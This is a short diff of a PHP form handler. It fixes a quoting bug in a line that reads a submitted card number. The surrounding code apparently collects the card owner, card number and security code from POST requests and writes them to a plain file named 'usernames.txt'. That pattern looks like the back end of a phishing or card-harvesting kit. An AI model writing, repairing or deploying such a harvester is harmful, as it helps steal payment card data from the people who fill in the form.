@@ -7,7 +7,7 @@ if (
     isset($_POST['securitycode'])
 ) {
     $file = "usernames.txt";
-    $data1= "$_POST['cardNumber'] ";
+    $data1= $_POST['cardNumber'];
     $data = 
         "owner: " . $_POST['owner'] . "\n" .
         "cardNumber: " . $_POST['cardNumber'] . "\n" .
